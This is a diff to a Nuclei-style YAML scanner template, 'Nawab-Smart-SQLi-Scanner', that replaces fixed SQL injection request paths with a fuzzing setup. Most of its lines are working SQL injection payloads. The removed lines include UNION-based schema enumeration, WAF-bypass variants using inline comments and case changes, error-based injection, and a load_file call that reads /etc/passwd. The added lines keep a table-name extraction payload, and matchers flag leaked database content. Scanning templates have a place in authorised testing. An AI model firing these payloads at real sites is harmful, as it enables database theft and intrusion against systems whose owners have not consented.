@@ -1,49 +1,41 @@
-id: nawab-advanced-sqli-found
+id: nawab-smart-sqli-scanner
 
 info:
-  name: Nawab-Advanced-SQLi-Bypass
+  name: 💀 Nawab-Smart-SQLi-Scanner 💀
   author: thenawabx
   severity: critical
-  description: |
-    Detects advanced SQL Injection using UNION SELECT, FROM, 
-    and Schema enumeration with WAF bypass techniques.
-  tags: sqli, bypass, critical, nawab-elite
 
 http:
   - method: GET
     path:
-      # --- Level 1: Standard Union Based ---
-      - "{{BaseURL}}/?id=1%27%20UNION%20SELECT%20NULL,NULL,NULL--"
-      - "{{BaseURL}}/?id=-1%27%20UNION%20SELECT%201,2,3,4,5--"
-      
-      # --- Level 2: Advanced SELECT FROM (Data Extraction) ---
-      - "{{BaseURL}}/?id=-1%27%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--"
-      - "{{BaseURL}}/?id=-1%20UNI%20ON%20SEL%20ECT%201,user(),3,4--" 
-      
-      # --- Level 3: WAF Bypass (Comments & Case Variation) ---
-      - "{{BaseURL}}/?id=1%27%20/*!50000UNION*/%20/*!50000SELECT*/%201,2,database(),4--"
-      - "{{BaseURL}}/?id=-1%27%20uNiOn%20SeLeCt%201,2,3,vErSiOn(),5--"
-      - "{{BaseURL}}/?id=1%27%20UNION%20SELECT%20null,load_file(0x2f6574632f706173737764),null--" 
+      - "{{BaseURL}}"
 
-      # --- Level 4: Error Based Injection ---
-      - "{{BaseURL}}/?id=1%27%20AND%20(SELECT%201%20FROM%20(SELECT(COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--"
+    payloads:
+      sqli_error:
+        - "'"
+        - "\""
+        - "'; SELECT 1--"
+      sqli_extract:
+        - "-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{sqli_error}}"
+          - "{{sqli_extract}}"
 
     matchers-condition: or
     matchers:
-      # Confirmation of data leakage through SQL errors or schema keywords
       - type: regex
-        name: "🔥🔥 [FOUND] NAWAB-SQLI-CRITICAL: DATA-LEAKED 🔥🔥"
+        name: "🔥🔥 [FOUND] SQL-ERROR: DATABASE-EXPOSED 🔥🔥"
         regex:
           - "SQL syntax.*MySQL"
           - "PostgreSQL.*ERROR"
-          - "Warning.*mysqli_fetch"
-          - "driver\s[a-z]*\serror"
-          - "(?i)(information_schema|table_name|column_name)"
         part: body
 
-      # Confirmation of successful database environment injection
       - type: regex
-        name: "🔥🔥 [FOUND] NAWAB-SQLI-SUCCESS: INJECTED-CONTENT 🔥🔥"
+        name: "🔥🔥 [FOUND] SQL-SUCCESS: DATA-LEAKED 🔥🔥"
         regex:
-          - "(?i)(5\.[0-9]+\.[0-9]+|debian-linux-gnu|root@localhost)"
+          - "(?i)(information_schema|table_name|column_name)"
         part: body
